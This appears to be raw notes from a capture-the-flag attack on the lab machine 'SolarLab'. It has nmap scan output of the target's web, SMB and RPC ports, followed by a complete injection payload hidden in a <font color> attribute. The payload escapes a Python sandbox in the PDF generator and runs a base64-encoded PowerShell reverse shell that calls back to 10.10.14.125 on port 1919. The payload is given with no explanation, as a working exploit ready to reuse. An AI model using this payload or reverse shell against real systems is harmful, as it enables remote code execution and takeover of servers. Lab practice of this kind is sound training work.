SolarLab

└─# nmap 10.10.11.16 -p- --min-rate=5000 -Pn --open --reason
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 18:55 EDT
Nmap scan report for 10.10.11.16
Host is up, received user-set (0.10s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 127
135/tcp  open  msrpc        syn-ack ttl 127
139/tcp  open  netbios-ssn  syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
6791/tcp open  hnm          syn-ack ttl 127

└─# nmap 10.10.11.16 -p80,135,139,445,6791 -sV -sC -Pn -vv --min-rate=5000 -oA nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 18:57 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:57
Completed NSE at 18:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:57
Completed NSE at 18:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:57
Completed NSE at 18:57, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:57
Completed Parallel DNS resolution of 1 host. at 18:57, 0.02s elapsed
Initiating SYN Stealth Scan at 18:57
Scanning 10.10.11.16 [5 ports]
Discovered open port 445/tcp on 10.10.11.16
Discovered open port 139/tcp on 10.10.11.16
Discovered open port 135/tcp on 10.10.11.16
Discovered open port 80/tcp on 10.10.11.16
Discovered open port 6791/tcp on 10.10.11.16
Completed SYN Stealth Scan at 18:57, 0.14s elapsed (5 total ports)
Initiating Service scan at 18:57
Scanning 5 services on 10.10.11.16
Completed Service scan at 18:57, 11.99s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.11.16.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:57
NSE Timing: About 99.86% done; ETC: 18:58 (0:00:00 remaining)
Completed NSE at 18:58, 40.40s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:58
Completed NSE at 18:58, 0.43s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:58
Completed NSE at 18:58, 0.01s elapsed
Nmap scan report for 10.10.11.16
Host is up, received user-set (0.099s latency).
Scanned at 2024-05-15 18:57:20 EDT for 53s

PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 nginx 1.24.0
|_http-server-header: nginx/1.24.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://solarlab.htb/
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
6791/tcp open  http          syn-ack ttl 127 nginx 1.24.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 0s
| smb2-time: 
|   date: 2024-05-15T22:57:38
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 64857/tcp): CLEAN (Timeout)
|   Check 2 (port 37138/tcp): CLEAN (Timeout)
|   Check 3 (port 48381/udp): CLEAN (Timeout)
|   Check 4 (port 52237/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:58
Completed NSE at 18:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:58
Completed NSE at 18:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:58



Completed NSE at 18:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.49 seconds
           Raw packets sent: 5 (220B) | Rcvd: 5 (220B)



           <para>

    <font color="[ [ getattr(pow,Attacker('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyADUAIgAsADEAOQAxADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA') for Attacker in [orgTypeFun('Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">

    exploit

    </font>

</para>
